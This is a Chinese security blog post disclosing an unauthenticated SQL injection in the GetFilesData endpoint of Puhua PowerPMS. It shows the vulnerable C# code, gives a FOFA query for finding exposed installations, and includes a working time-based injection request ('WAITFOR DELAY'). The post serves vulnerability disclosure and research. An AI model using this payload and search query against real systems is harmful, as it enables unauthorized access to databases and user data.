---
title: "普华Powerpms GetFilesData SQL注入漏洞"
source: https://mrxn.net/jswz/powerpms-UploadFle-GetFilesData-sqli.html
asset_dir: assets/普华powerpms-getfilesdata-sql注入漏洞
---

# 普华Powerpms GetFilesData SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/22 12:27
* 1359浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

软件

计算机安全

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统GetFilesData接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

系统采用MVC文件架构，直接在`controller`里搜文件操作相关的方法找到`UploadFle`，在其中找到`GetFilesData`的实现

```
[Power.Controls.PMS.Action(Authorize = false)]
public string GetFilesData(string EpsProjId, string StartDate, string EndDate)
{
  Power.Global.ViewResultModel viewResultModel = Power.Global.ViewResultModel.Create(true, "");
  DataTable dataTable1 = DAL.QuerySQL("select name from syscolumns where id=object_id('PB_DocFiles')and name='UpdDate'");
  DataTable dataTable2 = DAL.QuerySQL($"select LongCode from dbo.PLN_project where project_guid ='{EpsProjId}'");
  if (dataTable2 != null && ((InternalDataCollectionBase) dataTable2.Rows).Count > 0)
```

Authorize = false 表明此接口不需要鉴权

代码安全审计

深入探索

漏洞扫描器

技术文章订阅

Web安全课程

[![普华Powerpms GetFilesData SQL注入漏洞](images/img-001-81ed14d76904.webp)](https://image.mrxn.net/a29dc94ae1994aef8801ad5d65e03a37.webp)

同时可以看到`EpsProjId`参数被直接拼接进SQL语句中执行，无过滤或校验，因此造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，就是朴实无华。

漏洞预警服务

深入探索

Windows安全工具

SQL注入检测工具

防火墙软件

# 漏洞复现

```
POST /UploadFle/GetFilesData HTTP/1.1
Host: powerpms.mrxn.net

EndDate=2025&EpsProjId=1'WAITFOR DELAY'0:0:5'--&StartDate=2025
```

[![普华Powerpms GetFilesData SQL注入漏洞](images/img-002-d8e74ea160f1.webp)](https://image.mrxn.net/218f07b4ccf04b6294396fbc2147dc40.webp)

成功延时5秒

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[普华Powerpms GetFilesData SQL注入漏洞](https://mrxn.net/jswz/powerpms-UploadFle-GetFilesData-sqli.html)  
文章链接：<https://mrxn.net/jswz/powerpms-UploadFle-GetFilesData-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-UploadFle-GetFilesData-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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